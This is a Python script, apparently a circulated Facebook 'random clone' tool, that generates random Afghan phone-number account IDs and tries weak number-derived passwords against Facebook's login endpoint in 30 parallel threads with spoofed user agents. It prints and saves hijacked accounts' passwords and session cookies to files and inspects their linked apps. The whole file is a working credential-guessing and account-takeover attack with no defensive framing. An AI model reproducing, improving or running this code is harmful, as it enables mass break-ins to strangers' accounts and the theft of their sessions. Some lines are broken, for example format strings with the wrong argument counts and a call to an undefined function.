#Updated by Z E Z O 
#It is permissible for you 
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import marshal
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python Z E Z O.py')
from bs4 import BeautifulSoup
ugen = []
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
LUQMAN = '{ LUQMAN }'
ugen2=[]
ugen=[]
for moad in range(5): 
    a='Mozilla/5.0 (Linux; Android 10.1.0; C5 2012 Build/OPM2.291039.025) AppleWebKit/657.46 (KHTML, like Gecko) Chrome/122.0.6261.64 Mobile Safari/537.36'
    b=random.choice(['8','9','10','11','12','13','14','15'])
    c='Infinix X6811B Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(40,116)
    e='0'
    f=random.randrange(3000,6000)
    g=random.randrange(20,190)
    h='Mobile Safari/537.36'
    ua=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(ua) 
   
 
loop = 0
cps = []
oks = []
twf = []
os.system('xdg-open https://t.me/Spiderexplanations')
os.system('xdg-open https://t.me/Spiderexplanations')



def clear():
    os.system('clear')
    print(logo)

logo = """
 \x1b[1;97m   
 \x1b[1;92m     
 \x1b[1;97m   
 \x1b[1;92
 \x1b[1;97m
 \x1b[1;92m     
 \x1b[1;97m
 \x1b[1;92m        UPDATED BY  : Z E  Z O 
\033[1;91m
  
███████╗███████╗███████╗ ██████╗ 
╚══███╔╝██╔════╝╚══███╔╝██╔═══██╗
  ███╔╝ █████╗    ███╔╝ ██║   ██║
 ███╔╝  ██╔══╝   ███╔╝  ██║   ██║
███████╗███████╗███████╗╚██████╔╝
╚══════╝╚══════╝╚══════╝ ╚══  
                                 
=========================================================="""
def linex():
    print(f'{GREEN}==========================================================')
def checks(oks,cps,twf):
    if not len(oks) != 0:
        pass
    if len(cps) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mAbid-OK.txt' % (
            H, P, str(len(oks))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mAbid-CP.txt' %
              (H, P, str(len(cps))))
        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[1;97mAbid-2F.txt' %
              (H, P, str(len(twf))))
        input("\x1b[1;97mPRESE ENTER TO BACK xyz  ")
        xyz()
loop = 0
cps = []
oks = []
twf = []
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO ACTIVE  APKS 🎮%s  '%(ORANGE))
    else:
        print(f'\r {GREEN}[√] %sYOUR ACTIVE APPLICATION DETAILS :'%(GREEN))
        for i in range(len(game)):
            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO EXPIRED APKS 🎮%s'%(ORANGE))
    else:
        print(f'\r 🎮  %{RED}sYOUR EXPIRED APKS DETAILS :'%(RED))
        for i in range(len(game)):
            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Kedaluwarsa"," Kedaluwarsa"),N))
            print(f"{GREEN}[√]---------------------------------------------------[√]")
    #____________#
def xyz():
    os.system("play-audio WELCOME_TO_HAMI_BOOT_818.mp3")
    os.getuid
    os.system("clear");print(logo)
    print('           \x1b[97m[\033[37;41m  M A I N   M E N U   \033[0;m] ')
    print(f"")
    print(f"{BLUE}[01] {GREEN}RANDOM CLONE AFG  M1")
    print(f"{BLUE}[00] {GREEN}EXIT  ")
    print(f"")
    print(f"\033[1;91m========================================================")
    LUQMAN = input("[√] CHOOSE : ")
    if LUQMAN in ["1","01"]:
        Tabii()
    elif LUQMAN in ["0","00"]:
       exit()
    else:
        print('\033[1;31mINCORECT OPTION!\033[1;31m')
        xyz()

def Tabii():
    user=[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
    print(f"")
    print(' 9370 ,9378 ,9372 ,9373')
    print(f" 9376 ,9377 ,9374 ,9379")
    print(f" 21894 ,21893 ,21891 ,21892")
    print(f"")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 1000, 2000, 5000, 10000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:    
        clear()
        tl = str(len(user))
        print(f" {BLUE}TOTAL IDZ             : {GREEN}"+tl)
        print(f" {BLUE}COUNTRY YOU CHOOSE    : {GREEN} AFGHANISTAN ")
        print(f" {BLUE}NUMBER YOU PUT        : {GREEN}"+code)
        print(f" {BLUE}PROCESS HAS BEEN STARTED")
        print(f'{GREEN}===========================================================')
        for love in user:
            uid = code+love
            pwx = [love,'091'+love,'092'+love,'094'+love,love+love]
            yaari.submit(free,uid,pwx,tl)
def free(uid,pwx,tl):
    global loop
    global oks
    global agents
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            pro = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'free.facebook.com',
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
           'accept-language': 'ar-AE,ar;q=0.9,en-AE;q=0.8,en;q=0.7,ja-JP;q=0.6,ja;q=0.5,en-US;q=0.4',
           'cache-control': 'max-age=0',
           'dpr': '3.375',
           'referer': 'https://free.facebook.com/',
           'sec-ch-prefers-color-scheme': 'dark',
           'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
           'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
           'sec-ch-ua-mobile': '?1',
           'sec-ch-ua-model': '"RMX2096"',
           'sec-ch-ua-platform': '"Android"',
           'sec-ch-ua-platform-version': '"14.0.0"',
           'sec-fetch-dest': 'document',
           'sec-fetch-mode': 'navigate',
           'sec-fetch-site': 'same-origin',
           'sec-fetch-user': '?1',
           'upgrade-insecure-requests': '1',
           'user-agent':pro,
           'viewport-width': '980',}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            sys.stdout.write(f'\r\33[1;37m[Z E Z O ] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
            sys.stdout.flush()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[232:247]
                print(f'\r{GREEN}[Z E Z O-OK] '+uid+' | '+ps+'\n'f'{YELLOW}'+coki+'')
                Elite(uid,ps,coki)
                oks.append(cid) 
                cek_apk(session,coki)
                open('/sdcard/Z E Z O-OK.txt', 'a').write(cid+' | '+ps+'\n')
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r{RED}[Z E Z O-CP] '+uid+' | '+ps+'')
                open('/sdcard/Z E Z O-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            elif '/x/checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid=coki[7:22]
                Red = '\033[1;31m'
                print(f'\r{YELLOW}[TEMP-LOCK] '+cid+' | '+ps+'\033[1;97m')
                open('/sdcard/Z E Z O-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        checks(oks,cps,twf)
    except:
        pass

        
 
if __name__ == '__main__':
    xyz()
